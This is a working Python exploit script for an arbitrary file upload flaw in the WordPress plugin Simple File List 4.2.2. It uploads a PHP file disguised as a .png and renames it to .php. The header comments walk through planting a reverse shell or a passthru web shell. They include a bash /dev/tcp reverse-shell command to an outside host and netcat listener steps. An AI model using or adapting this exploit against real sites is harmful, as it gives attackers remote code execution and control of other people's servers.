#!/usr/bin/python

# This is an older version of exploit https://npulse.net/en/exploits/48979
# You might need to replace the following lines in order for the script to work.
# file_name = raw_input('[*] Enter File Name (working directory): ')     to     file_name = input('[*] Enter File Name (working directory): ') 
# protocol = raw_input('[*] Enter protocol (http/https): ')              to     protocol = input('[*] Enter protocol (http/https): ')

# Exploit Title: Wordpress Plugin Simple File List 4.2.2 - Arbitrary File Upload
# Date: 2020-11-01
# Exploit Author: H4rk3nz0 based off exploit by coiffeur
# Original Exploit: https://www.exploit-db.com/exploits/48349
# Vendor Homepage: https://simplefilelist.com/
# Software Link: https://wordpress.org/plugins/simple-file-list/ 
# Version: Wordpress v5.4 Simple File List v4.2.2 

# Exploitation steps
# Method 1:
# Code execution
#  1. Create a php file in the same folder as the exploit containg a reverse_shell.php code. (Try port 80)
#     https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/main/reverse_shell.php            -- configure the host and proper IP evidently
#  2. [*] Enter File Name (working directory): reverse_shell.php
#     [*] Enter protocol (http/https): http
#     [+] File renamed to reverse_shell.png
#     [^-^] Exploit seems to have worked...
#        URL: http://192.168.68.105/wp-content/uploads/simple-file-list/reverse_shell.php
### Shell it
#  3. nc -lvnp 80
#  4. Access http://192.168.68.105/wp-content/uploads/simple-file-list/reverse_shell.php      -- you should obtain a shell of the system

# Method 2:
# Command Injection
# 1. Create a php file in the same folder as the exploit containg php code.  nano test.php  containing <?php passthru($_GET['cmd']);?>
# 2. python exploit.py $IP
#   [*] Enter File Name (working directory): test.php
#   [*] Enter protocol (http/https): http
#   [+] File renamed to cmd.png
#   [^-^] Exploit seems to have worked...
#      URL: http://192.168.68.105/wp-content/uploads/simple-file-list/cmd.php
# 3. Navigate to http://192.168.68.105/wp-content/uploads/simple-file-list/cmd.php?cmd=id          <-- You should see the contents of the id command -->
### Shell it
# 4. nc -lvnp 80
# 5. http://192.168.68.105/wp-content/uploads/simple-file-list/cmd.php?cmd=/bin/bash -i >& /dev/tcp/192.168.49.68/80 0>&1     (URL encode it)



import requests
import random
import hashlib
import sys
import os
import urllib3
urllib3.disable_warnings()

dir_path = '/wp-content/uploads/simple-file-list/'
upload_path = '/wp-content/plugins/simple-file-list/ee-upload-engine.php'
move_path = '/wp-content/plugins/simple-file-list/ee-file-engine.php'
file_name = input('[*] Enter File Name (working directory): ')
protocol = input('[*] Enter protocol (http/https): ')
http = protocol + '://'

def usage():
    banner ="""
USAGE: python simple-file-list-upload.py <ip-address> 
NOTES: Append :port to IP if required.
       Advise the usage of a webshell as payload. Reverseshell payloads can be hit or miss.
    """
    print (banner)


def file_select():
    filename = file_name.split(".")[0]+'.png'
    with open(file_name) as f:
        with open(filename, 'w+') as f1:
            for line in f:
                f1.write(line)
    print ('[+] File renamed to ' + filename)
    return filename


def upload(url, filename):
    files = {'file': (filename, open(filename, 'rb'), 'image/png')}
    datas = {
        'eeSFL_ID': 1,
        'eeSFL_FileUploadDir': dir_path,
        'eeSFL_Timestamp': 1587258885,
        'eeSFL_Token': 'ba288252629a5399759b6fde1e205bc2',
        }
    r = requests.post(url=http + url + upload_path, data=datas,
                      files=files, verify=False)
    r = requests.get(url=http + url + dir_path + filename, verify=False)
    if r.status_code == 200:
        print ('[+] File uploaded at ' + http + url + dir_path + filename)
        os.remove(filename)
    else:
        print ('[-] Failed to upload ' + filename)
        exit(-1)
    return filename


def move(url, filename):
    new_filename = filename.split(".")[0]+'.php'
    headers = {'Referer': http + url + '/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1',
         'X-Requested-With': 'XMLHttpRequest'}
    datas = {
        'eeSFL_ID': 1,
        'eeFileOld': filename,
        'eeListFolder': '/',
        'eeFileAction': 'Rename|'+ new_filename,
        }
    r = requests.post(url= http + url + move_path, data=datas,
                      headers=headers, verify=False)
    if r.status_code == 200:
        print ('[+] File moved to ' + http + url + dir_path + new_filename)
    else:
        print ('[-] Failed to move ' + filename)
        exit(-1)
    return new_filename


def main(url):
    file_to_upload = file_select()
    uploaded_file = upload(url, file_to_upload)
    moved_file = move(url, uploaded_file)
    if moved_file:
        print ('[^-^] Exploit seems to have worked...')
        print ('\tURL: ' + http + url + dir_path + moved_file)


if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
        exit(-1)

    main(sys.argv[1])
